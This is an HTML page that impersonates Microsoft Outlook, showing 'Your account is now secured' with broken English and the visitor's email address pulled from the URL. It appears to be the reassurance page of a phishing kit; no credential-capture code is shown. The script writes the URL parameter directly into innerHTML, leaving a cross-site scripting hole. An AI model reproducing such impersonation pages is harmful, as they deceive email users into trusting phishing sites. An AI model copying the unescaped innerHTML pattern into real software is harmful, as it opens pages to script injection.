<!DOCTYPE html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1, shrink-to-fit=no" />

    <!-- Bootstrap CSS -->
    <link
      rel="stylesheet"
      href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css"
      integrity="sha384-xOolHFLEh07PJGoPkLv1IbcEPTNtaed2xpHsD9ESMhqIYd0nLMwNLD69Npy4HI+N"
      crossorigin="anonymous" />
    <link rel="stylesheet" href="/css/secured.css" />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" />

    <title>Outlook</title>
  </head>
  <body style="background-color: white">
    <div class="container-fluid">
      <div class="row" style="padding-right: 2px">
        <div class="col-md-3"></div>
        <div class="col-md-6 mt-4">
          <p
            style="
              font-size: 60px;
              font-weight: 600;
              color: black;
              text-align: center;
              margin-bottom: 20px;
            ">
            Outlook
          </p>
          <div
            style="
              background-color: white;
              padding-top: 35px;
              padding-bottom: 35px;
              padding-left: 20px;
              padding-right: 20px;
              border: solid 3px rgb(203, 202, 202);
              box-shadow: 10px 10px 10px rgb(108, 108, 108);
            ">
            <img src="/image/RE1Mu3b.png" alt="" style="height: 33px" />
            <div>
              <p style="font-size: 22px; margin-top: 32px; margin-bottom: 28px">
                <span id="emailP"></span>
              </p>
              <p
                style="
                  font-size: 33px;
                  font-weight: 600;
                  color: black;
                  margin-bottom: 0px;
                ">
                Your account is now secured
              </p>
              <p style="font-size: 20px" class="mt-4 mb-3">
                We advice that you secure your account with our new AI features.
              </p>
              <p style="font-size: 20px" class="mb-5">
                Our technical crew will be persistent in sending you our new
                security features.
              </p>
              <p style="font-size: 20px"><strong>Thank you.</strong></p>
            </div>
          </div>
        </div>
        <div class="col-md-3"></div>
      </div>
    </div>
    <script>
      const emailP = document.getElementById("emailP");
      const urlParams = new URLSearchParams(window.location.search);
      const email = urlParams.get("e");
      emailP.innerHTML = email;
    </script>
    <script
      src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"
      integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj"
      crossorigin="anonymous"></script>
    <script
      src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"
      integrity="sha384-Fy6S3B9q64WdZWQUiU+q4/2Lc9npb8tCaSX9FK7E8HnRr0Jz8D6OP9dO5Vg3Q9ct"
      crossorigin="anonymous"></script>
  </body>
</html>
